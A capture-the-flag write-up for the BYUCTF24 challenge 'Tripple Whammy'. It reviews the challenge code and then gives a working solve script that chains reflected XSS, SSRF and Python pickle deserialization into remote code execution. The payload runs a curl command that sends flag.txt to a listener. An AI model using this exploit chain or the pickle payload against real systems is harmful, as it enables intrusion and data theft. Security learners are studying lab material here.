<h3> Tripple Whammy </h3>

Source: BYUCTF24

Hi, I didn't solve this during the CTF but i'm going to upsolve it because i happened to have seen the attachment stored on my laptop

Here's the [file](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/articles/attachments/triple-whammy.zip) incase you are interested

Ok let us get to it!

This are the list of files the attachment has
![image](https://github.com/user-attachments/assets/0fe057fa-3be8-42c5-bcf3-b5deb8c60735)

```
- admin_bot.js
- Dockerfile
- docker-compose.yml
- internal.py
- server.py
- start.sh
```

This is the content of the `Dockerfile`

```dockerfile
FROM python:3

# install dependencies
RUN apt-get update 
RUN apt-get upgrade -y 
RUN apt-get install curl libgconf-2-4 libatk1.0-0 libatk-bridge2.0-0 libgdk-pixbuf2.0-0 libgtk-3-0 libgbm-dev libnss3-dev libxss-dev libasound2 -y
RUN curl -sL https://deb.nodesource.com/setup_17.x | bash -
RUN apt-get update
RUN apt-get install nodejs -y
RUN apt-get install npm -y
RUN rm -rf /var/lib/apt/lists/*

# create ctf user and directory
RUN mkdir /ctf
WORKDIR /ctf
RUN useradd -M -d /ctf ctf

# copy files
COPY secret.txt /ctf/secret.txt
COPY flag.txt /ctf/flag.txt
COPY server.py /ctf/server.py
COPY internal.py /ctf/internal.py
COPY start.sh /ctf/start.sh
COPY admin_bot.js /ctf/admin_bot.js

# install flask and nodejs dependencies
RUN pip3 install flask requests
RUN npm install express puppeteer

# set permissions
RUN chown -R root:ctf /ctf 
RUN chmod -R 750 /ctf

CMD ["bash", "/ctf/start.sh"]

EXPOSE 1337
EXPOSE 1336
```

I didn't want to create a docker container to host this so I ran it locally

Modify the `start.sh` file to this

```bash
# run admin bot in the background
node admin_bot.js &

# run Flask server
while true; do
    python3 server.py &
    python3 internal.py
done
```

Now when we execute it, we should see this
![image](https://github.com/user-attachments/assets/d6e8cbde-aae7-4579-a29d-9d6884f323fb)

Time to do some code review to figure the bug and exploit it.

First we have 3 main important files which are:
- server.py
- internal.py
- admin_bot.js

From the javascript file `admin_bot.js` we can tell this is likely a `XSS` challenge 

Looking at the source code for that we it does some imports
![image](https://github.com/user-attachments/assets/bd516ceb-8030-433f-8f02-baf35a337e99)

It also reads the content of `secret.txt` and stores it in variable `SECRET` it also defines the `CHAL_URL` to be `http://127.0.0.1:1337/`

On my local host i created a fake `secret.txt` with content `SuperSecretKey`

This async function is used to setup the headless browser which would be used to access our provided url

```js
const visitUrl = async (url) => {

    let browser =
            await puppeteer.launch({
                headless: "new",
                pipe: true,
                dumpio: true,

                // headless chrome in docker is not a picnic
                args: [
                    '--no-sandbox',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-dev-shm-usage',
                    '--disable-setuid-sandbox',
                    '--js-flags=--noexpose_wasm,--jitless'
                ]
            })

    try {
        const page = await browser.newPage()

        try {
            await page.setUserAgent('puppeteer');
            let cookies = [{
                name: 'secret',
                value: SECRET,
                domain: '127.0.0.1',
                httpOnly: true
            }]
            await page.setCookie(...cookies)
            await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' })
        } finally {
            await page.close()
        }
    }
    finally {
        browser.close()
        return
    }
}
```

And while it accesses our url it would set the cookie `secret` to the value stored in variable `SECRET`

This handles the default route that would let the user give in the path we want the admin bot to visit

```js
app.get('/', async (req, res) => {
    html = `
    <html>
    <head>
        <title>Admin bot</title>
    </head>
    [................SNIPPED.....................]
    <body>
        <br><br><br>
        <div class="container">
            <h1>Have the admin bot visit a page on this site</h1>
            <div id="path_box">
                <div>http://127.0.0.1:1337/</div>
                <input type="text" id="path" name="path" size="50">
            </div>
            <button onclick="go()">Go</button>
        </div>
        <script>
            async function go() {
                document.getElementsByTagName('button')[0].disabled = true;
                document.getElementsByTagName('button')[0].textContent = "Visiting page..."
                let path = document.getElementById('path').value
                await fetch('/visit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'path=' + encodeURIComponent(path)
                })
                .then(response => response.text())
                .then(text => {
                    alert(text)
                })
                document.getElementsByTagName('button')[0].textContent = "Go"
                document.getElementsByTagName('button')[0].disabled = false;
            }
        </script>
    </body>
    </html>
    <html>`
    res.send(html)
});
```

And finally this
![image](https://github.com/user-attachments/assets/1bc1f9ef-e46c-4bb3-a833-b2fa3eb841cc)

```js
app.post('/visit', async (req, res) => {
    const path = req.body.path
    console.log('received path: ', path)

    let url = CHAL_URL + path;

    try {
        console.log('visiting url: ', url)
        await visitUrl(url)
    } catch (e) {
        console.log('error visiting: ', url, ', ', e.message)
        res.send('Error visiting page: ' + escape(e.message))
    } finally {
        console.log('done visiting url: ', url)
        res.send('Visited page.')
    }
});

const port = 1336
app.listen(port, async () => {
    console.log(`Listening on ${port}`)
})
```

It would get the path from the request body, concatenate it to the challenge url and make the headless browser access it

This bot instance is running on port 1336

So this bot would only access valid routes based on the challenge url!

Moving on let us check the server code
![image](https://github.com/user-attachments/assets/3dc7873e-9bb2-4277-9b60-e51598b7f19d)

```python
# imports
from flask import Flask, request
from urllib.parse import urlparse
import requests


# initialize flask
app = Flask(__name__)
SECRET = open("secret.txt", "r").read().strip()


# index
@app.route('/', methods=['GET'])
def main():
    name = request.args.get('name','')
    return 'Nope still no front end, front end is for noobs '+name
```

Luckily it was commented but nevertheless it is easy to understand

So this python code would import the standard libraries for working with Flask, urllib.parse and requests

Then it initilizes the app object and then reads in the content of `secret.txt` into the variable `SECRET`

The default route `/` gets the name value from the `name` parameter and then returns it with some string concatenated to it

The last available route is `/query` 

```python
@app.route('/query', methods=['POST'])
def query():
    # get "secret" cookie
    cookie = request.cookies.get('secret')

    # check if cookie exists
    if cookie == None:
        return {"error": "Unauthorized"}
    
    # check if cookie is valid
    if cookie != SECRET:
        return {"error": "Unauthorized"}
    
    # get URL
    try:
        url = request.json['url']
        print(f'finally {url}')
    except:
        return {"error": "No URL provided"}

    # check if URL exists
    if url == None:
        return {"error": "No URL provided"}
    
    # check if URL is valid
    try:
        url_parsed = urlparse(url)
        if url_parsed.scheme not in ['http', 'https'] or url_parsed.hostname != '127.0.0.1':
            return {"error": "Invalid URL"}
    except:
        return {"error": "Invalid URL"}
    
    
    # request URL
    try:
        requests.get(url)
    except:
        return {"error": "Invalid URL"}
    
    return {"success": "Requested"}


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337, threaded=True)
```

What this function basically does is to access the url which is in the request body but before it accesses it, some checks are done:
- Makes sure the secret cookie value equals value stored in variable `SECRET`
- The url wrapper is either http or https
- The url hostname is 127.0.0.1

So we know that this query function can be used to access internal service running and we can only make use of it only if we know the `SECRET` value

Because we can access internal service with this we have a Server Side Request Forgery (SSRF) vulnerability

Back to the `server.py` file, the bug there is pretty straight forward

There's an XSS vulnerability in the `/` route

We can see no sanitization is done before it renders our input

```python
@app.route('/', methods=['GET'])
def main():
    name = request.args.get('name','')
    return 'Nope still no front end, front end is for noobs '+name
```

Let us confirm it
![image](https://github.com/user-attachments/assets/4def6865-6663-4749-a97c-8b12d1d6c57d)

Now we inject basic html tags
![image](https://github.com/user-attachments/assets/88b54b33-32c1-4e52-bc36-a2d27b00b204)

And the holy grail
![image](https://github.com/user-attachments/assets/d794903a-69a4-4a70-9b82-0a684d5e9e1f)

Ok cool we've confirmed the XSS what now?

Well let us check the last code `internal.py`
![image](https://github.com/user-attachments/assets/555b61d8-160d-4470-8c16-9b08e860f0e5)

```python
# imports
from flask import Flask, request
import pickle, random


# initialize flask
app = Flask(__name__)
port = random.randint(5700, 6000)

# index
@app.route('/pickle', methods=['GET'])
def main():
    pickle_bytes = request.args.get('pickle')

    if pickle_bytes is None:
        return 'No pickle bytes'
    
    try:
        b = bytes.fromhex(pickle_bytes)
    except:
        return 'Invalid hex'
    
    try:
        data = pickle.loads(b)
    except:
        return 'Invalid pickle'

    return str(data)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=port, threaded=True)
```

Ok this has only one route which is `/pickle` and it requires the `GET` parameter `pickle` to be a `hex` which is then decoded and finally it uses `pickle.loads()` to load the serialized object

The port this service is running on is chosen at random between `5700-6000` 

This is clearly an insecure deserialization [vulnerability](https://portswigger.net/web-security/deserialization) because `pickle.loads()` is used for de-serializing a python serialized object and it isn't [secure](https://docs.python.org/3/library/pickle.html)

Now that we've looked through the source we see there are three main bugs:
- Cross Site Scripting (XSS)
- Server Side Request Forgery (SSRF)
- Insecure Deserialization

The third one is of high advantage because we can use that to get Remote Code Execution (RCE)

But we can't access that because it is running internally at some random port

How do we then go about this?

Because we have SSRF we can leverage that to access the internal service which is running the web service that gives us the deserialization vulnerability

But we can't really make use of the SSRF directly because to access `/query` we need to know the `SECRET` value and we don't know that

Luckily we can make use of the XSS to do this

That would work because when the admin bot visits our path it would set the cookie `secret` to hold the `SECRET` value and the `/query` route on the main server checks if the `secret` cookie value equals the `SECRET` value

Ok so it's clear now as to what we need to do:

```
- We need to craft an XSS payload that triggers the admin bot to send a POST request to the /query route.
- The request's body should contain a URL pointing to an internal web service with a deserialization vulnerability.
- The URL should include a GET parameter named pickle, which carries the deserialization payload
```

To achieve this I made use of the javascript [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) api

And for the internal web service port I just brute forced because it's feasible

Here's my solve scrpt

```python
import requests
import json
import pickle, os


class Pickle:
    def __reduce__(self):
        return (os.system,("curl http://localhost:8888/?flag=`cat flag.txt`",))


def visit(url, path):
    data = {
        'path': path
    }

    res = requests.post(url + '/visit', data=data)
    print(f'DEBUG: {res.text}')
    

WEB_URL = "http://127.0.0.1:1337"
BOT_URL = "http://127.0.0.1:1336"

def solve(port):
    obj = Pickle()
    pickled = pickle.dumps(obj)
    print(f'Pickled data: {pickled.hex()}')

    xss = f"""
    <script>
        fetch('/query', {{
            method: 'POST',
            mode: 'cors',
            credentials: 'include',
            headers: {{
                'Content-Type': 'application/json',
            }},
            body: JSON.stringify({{
                'url': 'http://127.0.0.1:{port}/pickle?pickle={pickled.hex()}'
            }})
        }});
    </script>
    """.strip().replace('\n', '')

    encoded = requests.utils.quote(xss)
    path = '?name=' + encoded
    print(encoded)

    visit(BOT_URL, path)


for port in range(5700, 6000):
    solve(port)
```

My deserialization payload would basically do this:

```
curl http://localhost:8888/?flag=`cat flag.txt`
```

We just need to set a listener on port 8888 to receive the flag!
![image](https://github.com/user-attachments/assets/6bba2413-0c31-4101-a44c-8777696aa3d1)


This is the overall XSS payload

```js
<script>
    fetch('/query', {{
        method: 'POST',
        mode: 'cors',
        credentials: 'include',
        headers: {{
            'Content-Type': 'application/json',
        }},
        body: JSON.stringify({{
            'url': 'http://127.0.0.1:{port}/pickle?pickle={pickled.hex()}'
        }})
    }});
</script>
```

Very fun challenge which involves chaining three vulnerabilities

And that's all!

